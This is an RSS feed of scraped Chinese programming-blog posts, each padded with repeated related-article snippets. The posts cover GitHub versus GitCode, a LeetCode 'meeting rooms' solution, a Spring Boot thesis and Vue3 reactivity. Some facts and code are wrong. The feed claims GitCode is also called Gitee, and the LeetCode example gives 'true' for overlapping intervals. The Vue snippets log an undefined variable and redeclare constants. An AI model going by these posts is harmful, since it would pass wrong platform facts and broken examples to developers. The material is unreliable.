<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0">
  <channel>
    <title>PPMY RSS</title>
    <link>https://www.ppmy.cn/news</link>
    <description>PPMY 网站文章 RSS</description>
    <docs>http://www.rssboard.org/rss-specification</docs>
    <generator>python-feedgen</generator>
    <language>zh-cn</language>
    <lastBuildDate>Fri, 31 Oct 2025 09:52:32 +0000</lastBuildDate>
    <item>
      <title>GitHub与GitCode</title>
      <link>https://www.ppmy.cn/news/1540432.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维GitHub与GitCodenews/2025/10/31 17:54:05/GitHubGitHub是一个面向开源及私有软件项目的托管平台，因为只支持Git作为唯一的版本库格式进行托管，故名GitHub。它提供了分布式版本控制系统Git，让开发者可以方便地进行版本控制和协同开发。GitHub上有着大量的开源项目，是全球最大的开源社区之一。GitCodeGitCode（又称为Gitee）是中国的一个代码托管平台，类似于GitHub，同样基于Git版本控制系统。GitCode主要面向中国的开发者，提供了代码托管、项目管理等功能。小结由于网络环境和政策因素，对于中国用户来说，GitCode可能在访问速度和合规性方面具有优势。对于开发者而言，选择使用GitHub还是GitCode，可以根据自己的需求以及所在地区的网络状况来决定。如果你的工作主要在中国，并且考虑到网络访问速度等因素，GitCode可能是更好的选择；而如果你参与的是国际项目或更倾向于使用全球最大的开源社区资源，则GitHub会是更好的选择。http://www.ppmy.cn/news/1540432.html相关文章电子电气架构在日新月异环境下的挑战我是穿拖鞋的汉子，魔都中坚持长期主义的汽车电子工程师。 
老规矩，分享一段喜欢的文字，避免自己成为高知识低文化的工程师： 屏蔽力是信息过载时代一个人的特殊竞争力，任何消耗你的人和事，多看一眼都是你的不对。非必要不费力证明自己，无利益不试图说服别人，是精神上的节…阅读更多...【C++刷题】力扣-#252-会议室题目描述 给定一个会议时间安排的数组 intervals&amp;#xff0c;每个 intervals[i] 表示一个会议的开始和结束时间。判断一个人是否能够参加所有的会议&amp;#xff08;即没有会议是重叠的&amp;#xff09;。 示例 
示例 1: 
输入&amp;#xff1a;intervals  [[0,30],[5,10],[15,20]]
输出&amp;…阅读更多...电影评论网站开发：Spring Boot技术解析1系统概述 1.1 研究背景 随着计算机技术的发展以及计算机网络的逐渐普及&amp;#xff0c;互联网成为人们查找信息的重要场所&amp;#xff0c;二十一世纪是信息的时代&amp;#xff0c;所以信息的管理显得特别重要。因此&amp;#xff0c;使用计算机来管理电影评论网站的相关信息成为必然。开发合适…阅读更多...Vue3 使用 ref、reactive响应式丢失文章目录 一、ref reactive实例1.引用ref reactive属性2.ref reactive替换整条数据3.ref reactive解构赋值 一、ref reactive实例 
1.引用ref reactive属性 单独引用ref reactive 修改其中某一个属性&amp;#xff0c;状态变量不会丢失&amp;#xff0c;正常使用 &lt;script setup lang&amp;q…阅读更多...【论文阅读】DL-SRIR综述20230. 摘要 
SISR与DL的介绍 
单图像超分辨率(SISR)是计算机视觉的一个重要研究领域,其目的是从低分辨率(LR)图像中恢复清晰、高分辨率(HR)图像。 
随着深度学习理论和技术的快速发展,深度学习被引入到图像超分辨率(SR)领域,并在许多领域取得了远远超过传统方法的成果。 
本文框架…阅读更多...《15分钟轻松学Go》教程目录在AI快速发展的时代&amp;#xff0c;学习Go语言依然很有用。Go语言擅长处理高并发任务&amp;#xff0c;也就是说可以同时处理很多请求&amp;#xff0c;这对于需要快速响应的AI服务非常重要。另外&amp;#xff0c;Go适合用来处理和传输大量数据&amp;#xff0c;非常适合机器学习模型的数据预处理。 
…阅读更多...Linux——K8S的pod的调度DeploymentStatefulSetDaemonsetreplicaSetReplicacontroller     // 从K8S的近期版本中将逐渐移除rcJobcronjob 
K8s 网络&amp;#xff1a; 
平台中的POD如何通信&amp;#xff1a; CNI 容器网络插件Coredns的组件 负责提供平台中的名称解析平台中的应用如何被客户端访问 Service // 将…阅读更多...【基础篇】AOF日志：宕机了，Redis如何避免数据丢失？背景 
如果有人问你&amp;#xff1a;“你会把 Redis 用在什么业务场景下&amp;#xff1f;”我想你大概率会说&amp;#xff1a;“我会把它当作缓存使用&amp;#xff0c;因为它把后端数据库中的数据存储在内存中&amp;#xff0c;然后直接从内存中读取数据&amp;#xff0c;响应速度会非常快。”没错&amp;#x…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:54:05 +0000</pubDate>
    </item>
    <item>
      <title>电子电气架构在日新月异环境下的挑战</title>
      <link>https://www.ppmy.cn/news/1540431.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维电子电气架构在日新月异环境下的挑战news/2025/10/31 17:54:04/我是穿拖鞋的汉子，魔都中坚持长期主义的汽车电子工程师。老规矩，分享一段喜欢的文字，避免自己成为高知识低文化的工程师：屏蔽力是信息过载时代一个人的特殊竞争力，任何消耗你的人和事，多看一眼都是你的不对。非必要不费力证明自己，无利益不试图说服别人，是精神上的节能减排。无人问津也好,技不如人也罢,你都要试着安静下来,去做自己该做的事.而不是让内心的烦躁、焦虑、毁掉你本就不多的热情和定力。时间不知不觉中，快要来到深秋。国庆假期结束，又开始忙碌的工作。空闲之余，成年人的我也不知道去哪里渡自己的灵魂，独自敲击一些文字算是对这段时间做一个记录。本文1000字左右！！！一、背景信息本文介绍了当今高度互联的消费类汽车和非道路车辆的电气和电子 (E/E) 架构的开发所面临的挑战，以及如何简化设计流程。为支持下一代汽车产品，制造商唯有采用涵盖先进的电气、网络和软件工程的现代解决http://www.ppmy.cn/news/1540431.html相关文章【C++刷题】力扣-#252-会议室题目描述 给定一个会议时间安排的数组 intervals&amp;#xff0c;每个 intervals[i] 表示一个会议的开始和结束时间。判断一个人是否能够参加所有的会议&amp;#xff08;即没有会议是重叠的&amp;#xff09;。 示例 
示例 1: 
输入&amp;#xff1a;intervals  [[0,30],[5,10],[15,20]]
输出&amp;…阅读更多...电影评论网站开发：Spring Boot技术解析1系统概述 1.1 研究背景 随着计算机技术的发展以及计算机网络的逐渐普及&amp;#xff0c;互联网成为人们查找信息的重要场所&amp;#xff0c;二十一世纪是信息的时代&amp;#xff0c;所以信息的管理显得特别重要。因此&amp;#xff0c;使用计算机来管理电影评论网站的相关信息成为必然。开发合适…阅读更多...Vue3 使用 ref、reactive响应式丢失文章目录 一、ref reactive实例1.引用ref reactive属性2.ref reactive替换整条数据3.ref reactive解构赋值 一、ref reactive实例 
1.引用ref reactive属性 单独引用ref reactive 修改其中某一个属性&amp;#xff0c;状态变量不会丢失&amp;#xff0c;正常使用 &lt;script setup lang&amp;q…阅读更多...【论文阅读】DL-SRIR综述20230. 摘要 
SISR与DL的介绍 
单图像超分辨率(SISR)是计算机视觉的一个重要研究领域,其目的是从低分辨率(LR)图像中恢复清晰、高分辨率(HR)图像。 
随着深度学习理论和技术的快速发展,深度学习被引入到图像超分辨率(SR)领域,并在许多领域取得了远远超过传统方法的成果。 
本文框架…阅读更多...《15分钟轻松学Go》教程目录在AI快速发展的时代&amp;#xff0c;学习Go语言依然很有用。Go语言擅长处理高并发任务&amp;#xff0c;也就是说可以同时处理很多请求&amp;#xff0c;这对于需要快速响应的AI服务非常重要。另外&amp;#xff0c;Go适合用来处理和传输大量数据&amp;#xff0c;非常适合机器学习模型的数据预处理。 
…阅读更多...Linux——K8S的pod的调度DeploymentStatefulSetDaemonsetreplicaSetReplicacontroller     // 从K8S的近期版本中将逐渐移除rcJobcronjob 
K8s 网络&amp;#xff1a; 
平台中的POD如何通信&amp;#xff1a; CNI 容器网络插件Coredns的组件 负责提供平台中的名称解析平台中的应用如何被客户端访问 Service // 将…阅读更多...【基础篇】AOF日志：宕机了，Redis如何避免数据丢失？背景 
如果有人问你&amp;#xff1a;“你会把 Redis 用在什么业务场景下&amp;#xff1f;”我想你大概率会说&amp;#xff1a;“我会把它当作缓存使用&amp;#xff0c;因为它把后端数据库中的数据存储在内存中&amp;#xff0c;然后直接从内存中读取数据&amp;#xff0c;响应速度会非常快。”没错&amp;#x…阅读更多...你的电脑能不能安装windows 11，用这个软件检测下就知道了为了应对Windows 11的推出&amp;#xff0c;一款名为WhyNotWin11的创新型诊断软件应运而生。这个强大的工具不仅仅是一个简单的兼容性检测器&amp;#xff0c;它更像是一位细心的数字医生&amp;#xff0c;全方位评估您的计算机是否准备好迎接微软最新操作系统的挑战。 
WhyNotWin11的功能远超…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:54:04 +0000</pubDate>
    </item>
    <item>
      <title>【C++刷题】力扣-#252-会议室</title>
      <link>https://www.ppmy.cn/news/1540430.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维【C++刷题】力扣-#252-会议室news/2025/10/31 17:54:03/题目描述给定一个会议时间安排的数组 intervals，每个 intervals[i] 表示一个会议的开始和结束时间。判断一个人是否能够参加所有的会议（即没有会议是重叠的）。示例示例 1:输入：intervals=[[0,30],[5,10],[15,20]]输出：false示例 2:输入：intervals=[[7,10],[9,12]]输出：true题解这个问题可以通过排序和贪心算法来解决。排序：首先根据会议的开始时间对 intervals 进行排序。检查重叠：遍历排序后的会议时间，对于每个会议，检查它的开始时间是否大于或等于前一个会议的结束时间。○ 如果是，说明没有重叠，继续检查下一个会议。○ 如果不是，说明存在重叠，返回 false。返回结果：如果所有会议检查完毕，没有发现重叠，返回 true。代码实现boolcanAttendMeetings(vector&lt;vector&lt;int&gt;&gt;&amp;intervals){sort(intervals.begin(),intervals.end());for(inti=1;i&lt;intervals.size();i++){if(intervals[i][0]&lt;intervals[i-1][1]){returnfalse;}}returntrue;}复杂度分析● 时间复杂度：O(n log n)，其中 n 是会议的数量。主要时间消耗在排序上。● 空间复杂度：O(1)，因为我们只使用了常数个额外变量。这个算法的优势在于它的时间效率较高，只需要一次遍历即可判断所有会议是否冲突，且不需要额外的存储空间。http://www.ppmy.cn/news/1540430.html相关文章电影评论网站开发：Spring Boot技术解析1系统概述 1.1 研究背景 随着计算机技术的发展以及计算机网络的逐渐普及&amp;#xff0c;互联网成为人们查找信息的重要场所&amp;#xff0c;二十一世纪是信息的时代&amp;#xff0c;所以信息的管理显得特别重要。因此&amp;#xff0c;使用计算机来管理电影评论网站的相关信息成为必然。开发合适…阅读更多...Vue3 使用 ref、reactive响应式丢失文章目录 一、ref reactive实例1.引用ref reactive属性2.ref reactive替换整条数据3.ref reactive解构赋值 一、ref reactive实例 
1.引用ref reactive属性 单独引用ref reactive 修改其中某一个属性&amp;#xff0c;状态变量不会丢失&amp;#xff0c;正常使用 &lt;script setup lang&amp;q…阅读更多...【论文阅读】DL-SRIR综述20230. 摘要 
SISR与DL的介绍 
单图像超分辨率(SISR)是计算机视觉的一个重要研究领域,其目的是从低分辨率(LR)图像中恢复清晰、高分辨率(HR)图像。 
随着深度学习理论和技术的快速发展,深度学习被引入到图像超分辨率(SR)领域,并在许多领域取得了远远超过传统方法的成果。 
本文框架…阅读更多...《15分钟轻松学Go》教程目录在AI快速发展的时代&amp;#xff0c;学习Go语言依然很有用。Go语言擅长处理高并发任务&amp;#xff0c;也就是说可以同时处理很多请求&amp;#xff0c;这对于需要快速响应的AI服务非常重要。另外&amp;#xff0c;Go适合用来处理和传输大量数据&amp;#xff0c;非常适合机器学习模型的数据预处理。 
…阅读更多...Linux——K8S的pod的调度DeploymentStatefulSetDaemonsetreplicaSetReplicacontroller     // 从K8S的近期版本中将逐渐移除rcJobcronjob 
K8s 网络&amp;#xff1a; 
平台中的POD如何通信&amp;#xff1a; CNI 容器网络插件Coredns的组件 负责提供平台中的名称解析平台中的应用如何被客户端访问 Service // 将…阅读更多...【基础篇】AOF日志：宕机了，Redis如何避免数据丢失？背景 
如果有人问你&amp;#xff1a;“你会把 Redis 用在什么业务场景下&amp;#xff1f;”我想你大概率会说&amp;#xff1a;“我会把它当作缓存使用&amp;#xff0c;因为它把后端数据库中的数据存储在内存中&amp;#xff0c;然后直接从内存中读取数据&amp;#xff0c;响应速度会非常快。”没错&amp;#x…阅读更多...你的电脑能不能安装windows 11，用这个软件检测下就知道了为了应对Windows 11的推出&amp;#xff0c;一款名为WhyNotWin11的创新型诊断软件应运而生。这个强大的工具不仅仅是一个简单的兼容性检测器&amp;#xff0c;它更像是一位细心的数字医生&amp;#xff0c;全方位评估您的计算机是否准备好迎接微软最新操作系统的挑战。 
WhyNotWin11的功能远超…阅读更多...代码复现（五）：GCPANet文章目录 net.py1.class Bottleneck&amp;#xff1a;残差块2.class ResNet&amp;#xff1a;特征提取3.class SRM&amp;#xff1a;SR模块4.class FAM&amp;#xff1a;FIA模块5.class CA&amp;#xff1a;GCF模块6.class SA&amp;#xff1a;HA模块7.class GCPANet&amp;#xff1a;网络架构 train.pytest.py 论文…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:54:04 +0000</pubDate>
    </item>
    <item>
      <title>电影评论网站开发：Spring Boot技术解析</title>
      <link>https://www.ppmy.cn/news/1540429.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维电影评论网站开发：Spring Boot技术解析news/2025/10/31 17:54:03/1系统概述1.1 研究背景随着计算机技术的发展以及计算机网络的逐渐普及，互联网成为人们查找信息的重要场所，二十一世纪是信息的时代，所以信息的管理显得特别重要。因此，使用计算机来管理电影评论网站的相关信息成为必然。开发合适的电影评论网站，可以方便管理人员对电影评论网站的管理，提高信息管理工作效率及查询效率，有利于更好的为人们服务。1.2研究目的随着互联网技术的快速发展，网络时代的到来，网络信息也将会改变当今社会。各行各业在日常企业经营管理等方面也在慢慢的向规范化和网络化趋势汇合。电影评论网站的信息化程度体现在将互联网与信息技术应用于经营与管理，以现代化工具代替传统手工作业。无疑，使用网络信息化管理使信息管理更先进、更高效、更科学，信息交流更迅速。对于之前电影评论网站的管理，大部分都是使用传统的人工方式去管理，这样导致了管理效率低下、出错频率高。而且，时间一长的话，积累下来的数据信息不容易保存，对于查询、更新还有维护会带来不少问题。对于数据交接也存在很大的隐患。如果采用电子化的存储方式就会带来很大的改善，而且给用户的查询带来了很大便利，因此设计一个电影评论网站刻不容缓，能够提高信息的管理水平。1.3系统设计思想一个成功的网站应明确建设网站的目的，确定网站的功能，确定网站规模、投入费用，进行必要的市场分析等。只有详细的策划，才能避免在网站建设中出现的很多问题，使网站建设能顺利进行。同时，一个大型的计算机网站系统，必须有一个正确的设计指导思想，通过合理选择数据结构、网络结构、操作系统以及开发环境，构成一个完善的网络体系结构，才能充分发挥计算机信息管理的优势。根据现实生活中网民的实际需求，本系统的设计按照下述原则进行。1.有效性：实际上这里的有效性包括两个方面的意思：有用性和可用性。有用性是指站点潜在的能满足用户需求的功能，而可用性是指能够通过站点的操作实现特定的目标。可以看出一个站点如果不能恰当运行或设计得非常槽糕就不是一个好站点。可用站点的效益应该非常高，并易于学习，在实现用户目标时令人满意而不出错。2.高可靠性：一个实用的网站同时必须是可靠的，本设计通过合理而先进的网络设计以及软、硬件的优化选型，可保证网站的可靠性与容错性。3.高安全性：在设计中，将充分利用网络软、硬件提供的各种安全措施，既可以保证用户共享资源，充分考虑系统及数据资源的容灾、备份、恢复的要求。为系统提供强大的数据库备份工具。可以保证关键数据的安全性。操作权限级，设置不同的角色确保每一步的操作权限，可以由管理员进行设置。4.先进性：采用目前国际上最先进的开发技术，使用JSP开发技术，MYSQL作为网站后台数据库。采用这些技术降低了以后的系统运营成本，提高了系统的稳定性和易维护性。5.采用标准技术：本网站的所有设计遵循国际上现行的标准进行，以提高系统的开放性。外观和技术平衡：系统采用Web风格的界面设计，界面友好、美观，使用方便，易学易用。网站设计的关键问题是外观和技术的平衡。外现不好的网站令人厌烦，站点可以运行很好，但却不能带动用户积极性，相反，如果外观非常有表现力，但技术有限，用户则会感到非常失望。在外观与技术之间需要确定一个清晰而连续的关系，即外观与站点的意图相关，对不同类型的网站处理方法不同。结论在这次毕业设计中遇到的最困难的方面就是在数据库方面的知识，在刚开始进行毕业设计的时候感觉十分困难，根本不知道该从何处下手，但不断的坚持，设计最终被完成。无论多么的困难，只要能够坚持下来，善于去找到好的材料来研究，在研究中充分利用资源，没有困难是不会被成功解决的。在开发系统的过程中，本人运用到了JSP技术和平时学习中所了解的一些技术，通过实现这些技术，大大提高了整个系统的性能。在论文中这些技术都做了比较详细的介绍。本系统还存在很多缺点和不完善的地方，例如有些细节上做的还不够完善，有些功能模块还需要加强。在今后的日子里，能够对这些不足进行改善。通过这次最终的毕业设计，平时所学到的知识不仅融合了，而且获得了许多计算机知识。在整个设计过程中明白了许多东西，也培养独立工作能力，树立信心，对自己能力的工作能力，我相信以后会学习和工作生活中有至关重要的作用。同时也大大提高了手的能力，使其难以充分体会探索的乐趣和成功的创作过程，设计过程中汲取的东西，是一笔宝贵的财富。回顾过去做毕业设计的整个过程，充满了付出和收获，但是当你看到成果的时候的感觉，是一种难以用言语表达的喜悦之感这些在毕业设计过程中学习到的东西将会使我终身受益！最后，感谢指导老师的关心和指导，在我毕业设计的整个过程中，他给与了我很多的帮助和讲解，在导师的帮助下我的毕业设计才能如此顺利的完成。致谢语经过几个多月的不断学习，我的毕业设计终于如期完成。此次毕业设计是对我们日常所学计算机理论知识的一次综合性评测，也是将理论应用到实践的一项考察。首先我要感谢此次指导我的老师，是他的及时纠正我在设计当中出现的问题，使得我的设计高质量完成。指导老师在我本次电影评论网站的开发过程中，为程序、框架的设计、代码等方面以及论文设计提供了很多宝贵的意见，并且为我推荐了许多相关的资料，他的指导和建议使我受益匪浅，通过老师的耐心辅导和指点，我的论文顺利完成，在此，我表示深刻的感谢。我也要感谢帮助过我的同学们，和我一起探讨论文的不足，给我的设计提出宝贵的建议，在这次设计中他们的帮助使得我的设计更加完善更加具体。最后，我也要感谢学校为我们提供了一个良好的学校环境。祝愿学校的领导教师以及和我一起奋斗的同学们工作顺利，事业有成，也要祝愿学校的前景更加辉煌。参考文献[1]付昕. 基于B/S模式仓库管理系统的实现[J].山东省农业管理干部学院学报, 2010, 27(4):166-168[2] 雷文华, 薛小文. MATLAB和Servlet在网络数据处理中的应用[J]. 电子测试, 2010, (11):81-86.[3] 黄艳峰. 在Java语言中实施“案例教学”的研究与探索[J]. 电脑知识与技术, 2010, 6(5):1148-1149[4] 王玉英. 基于JSP的MySQL数据库访问技术[J]. 现代计算机：专业版, 2010, 19(14):63-66[5] 赵钢. JSP Servlet+EJB的Web模式应用研究[J]. 电子设计工程, 2013, 21(13):47-49[6] David L.Anderson.Managing Information Systems.清华大学出版社，2002：16[7] 王家华．软件工程[M]，沈阳：东北大学出版社，2011：46[8] 张孝祥,徐明华.软件开发课堂.清华大学出版社，2009：55[9] 崔洋.MySQL数据库应用从入门到精通.中国铁道出版社，2013：27[10] 王珊,萨师煊.数据库系统概论.高等教育出版社, 2006：16[11] 崔洋.MySQL数据库应用从入门到精通.中国铁道出版社，2013：27[12] 王珊,萨师煊.数据库系统概论.高等教育出版社, 2006：16[13] 张海潘.软件工程导论.清华大学出版社，2008：86[14] 黄艳峰. 在Java语言中实施“案例教学”的研究与探索[J]. 电脑知识与技术, 2010, 6(5):1148-1149[15] 王玉英. 基于JSP的MySQL数据库访问技术[J]. 现代计算机：专业版, 2010, 19(14):63-66http://www.ppmy.cn/news/1540429.html相关文章Vue3 使用 ref、reactive响应式丢失文章目录 一、ref reactive实例1.引用ref reactive属性2.ref reactive替换整条数据3.ref reactive解构赋值 一、ref reactive实例 
1.引用ref reactive属性 单独引用ref reactive 修改其中某一个属性&amp;#xff0c;状态变量不会丢失&amp;#xff0c;正常使用 &lt;script setup lang&amp;q…阅读更多...【论文阅读】DL-SRIR综述20230. 摘要 
SISR与DL的介绍 
单图像超分辨率(SISR)是计算机视觉的一个重要研究领域,其目的是从低分辨率(LR)图像中恢复清晰、高分辨率(HR)图像。 
随着深度学习理论和技术的快速发展,深度学习被引入到图像超分辨率(SR)领域,并在许多领域取得了远远超过传统方法的成果。 
本文框架…阅读更多...《15分钟轻松学Go》教程目录在AI快速发展的时代&amp;#xff0c;学习Go语言依然很有用。Go语言擅长处理高并发任务&amp;#xff0c;也就是说可以同时处理很多请求&amp;#xff0c;这对于需要快速响应的AI服务非常重要。另外&amp;#xff0c;Go适合用来处理和传输大量数据&amp;#xff0c;非常适合机器学习模型的数据预处理。 
…阅读更多...Linux——K8S的pod的调度DeploymentStatefulSetDaemonsetreplicaSetReplicacontroller     // 从K8S的近期版本中将逐渐移除rcJobcronjob 
K8s 网络&amp;#xff1a; 
平台中的POD如何通信&amp;#xff1a; CNI 容器网络插件Coredns的组件 负责提供平台中的名称解析平台中的应用如何被客户端访问 Service // 将…阅读更多...【基础篇】AOF日志：宕机了，Redis如何避免数据丢失？背景 
如果有人问你&amp;#xff1a;“你会把 Redis 用在什么业务场景下&amp;#xff1f;”我想你大概率会说&amp;#xff1a;“我会把它当作缓存使用&amp;#xff0c;因为它把后端数据库中的数据存储在内存中&amp;#xff0c;然后直接从内存中读取数据&amp;#xff0c;响应速度会非常快。”没错&amp;#x…阅读更多...你的电脑能不能安装windows 11，用这个软件检测下就知道了为了应对Windows 11的推出&amp;#xff0c;一款名为WhyNotWin11的创新型诊断软件应运而生。这个强大的工具不仅仅是一个简单的兼容性检测器&amp;#xff0c;它更像是一位细心的数字医生&amp;#xff0c;全方位评估您的计算机是否准备好迎接微软最新操作系统的挑战。 
WhyNotWin11的功能远超…阅读更多...代码复现（五）：GCPANet文章目录 net.py1.class Bottleneck&amp;#xff1a;残差块2.class ResNet&amp;#xff1a;特征提取3.class SRM&amp;#xff1a;SR模块4.class FAM&amp;#xff1a;FIA模块5.class CA&amp;#xff1a;GCF模块6.class SA&amp;#xff1a;HA模块7.class GCPANet&amp;#xff1a;网络架构 train.pytest.py 论文…阅读更多...基于SSM+微信小程序的实验室设备故障报修管理系统2&amp;#x1f449;文末查看项目功能视频演示获取源码sql脚本视频导入教程视频 
1、项目介绍 
基于SSM微信小程序的实验室设备故障报修管理系统2实现了管理员&amp;#xff0c;用户&amp;#xff0c;维修员三个角色。 
管理员功能有 个人中心&amp;#xff0c;用户管理&amp;#xff0c;维修员管理&amp;#…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:54:03 +0000</pubDate>
    </item>
    <item>
      <title>Vue3 使用 ref、reactive响应式丢失</title>
      <link>https://www.ppmy.cn/news/1540428.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Vue3 使用 ref、reactive响应式丢失news/2025/10/31 17:54:02/文章目录一、ref reactive实例1.引用ref reactive属性2.ref reactive替换整条数据3.ref reactive解构赋值一、ref reactive实例1.引用ref reactive属性单独引用ref reactive 修改其中某一个属性，状态变量不会丢失，正常使用&lt;script setup lang="ts"&gt;import{ref,reactive,toRefs,toRef}from"vue";constcount=ref(0);constobj=reactive({a:1,b:2,});constadd=()=&gt;{// 单独引用ref reactive属性 可以直接修改 响应式状态count.value++;obj.a++;console.log(a.value,obj);// {a:2 , b:2}};&lt;/script&gt;2.ref reactive替换整条数据ref可以替换整个对象，依然保持响应式reactive 替换整个对象 会失去响应式 需要使用toRef / toRefs 将响应式对象转为普通响应式&lt;script setup lang="ts"&gt;import{ref,reactive,toRefs,toRef}from"vue";constobj=reactive({a:1,b:2,});constobj1=ref({a:1,b:2,});constadd=()=&gt;{// ref可以正常替换整个对象obj1.value={a:3,b:4,};// reactive 不能直接替换对象，需要使用Object.assignObject.assign(obj,{a:2,b:3,});// {a: 2, b: 3}//或者Object.assign(obj,{...obj,a:2,b:3});// {a: 2, b: 3}};&lt;/script&gt;3.ref reactive解构赋值ref可以正常结构赋值，依然保持响应式reactive 使用toRefs toRef 使响应式对象变成普通响应式对象(简单来说 将reactive转为ref后面需要带value)，而不破坏响应式&lt;script setup lang="ts"&gt;import{ref,reactive,toRefs,toRef}from"vue";constobj=reactive({a:1,b:2,});constobj1=ref({a:1,b:2,c:{d:3,e:4}});constadd=()=&gt;{// ref可以正常解构赋值const{a,b}=obj1.value;// 1 2// 需要使用toRefs改变整个对象const{a,b}=toRefs(obj1);// 1 2//使用toRef改变对象某个属性consta=toRef(obj,"a");// 1// 让 person 的属性变为独立的响应式 重复赋值const{d,e}=toRefs(obj1.c);obj1.c={d:6,e:7};};&lt;/script&gt;http://www.ppmy.cn/news/1540428.html相关文章【论文阅读】DL-SRIR综述20230. 摘要 
SISR与DL的介绍 
单图像超分辨率(SISR)是计算机视觉的一个重要研究领域,其目的是从低分辨率(LR)图像中恢复清晰、高分辨率(HR)图像。 
随着深度学习理论和技术的快速发展,深度学习被引入到图像超分辨率(SR)领域,并在许多领域取得了远远超过传统方法的成果。 
本文框架…阅读更多...《15分钟轻松学Go》教程目录在AI快速发展的时代&amp;#xff0c;学习Go语言依然很有用。Go语言擅长处理高并发任务&amp;#xff0c;也就是说可以同时处理很多请求&amp;#xff0c;这对于需要快速响应的AI服务非常重要。另外&amp;#xff0c;Go适合用来处理和传输大量数据&amp;#xff0c;非常适合机器学习模型的数据预处理。 
…阅读更多...Linux——K8S的pod的调度DeploymentStatefulSetDaemonsetreplicaSetReplicacontroller     // 从K8S的近期版本中将逐渐移除rcJobcronjob 
K8s 网络&amp;#xff1a; 
平台中的POD如何通信&amp;#xff1a; CNI 容器网络插件Coredns的组件 负责提供平台中的名称解析平台中的应用如何被客户端访问 Service // 将…阅读更多...【基础篇】AOF日志：宕机了，Redis如何避免数据丢失？背景 
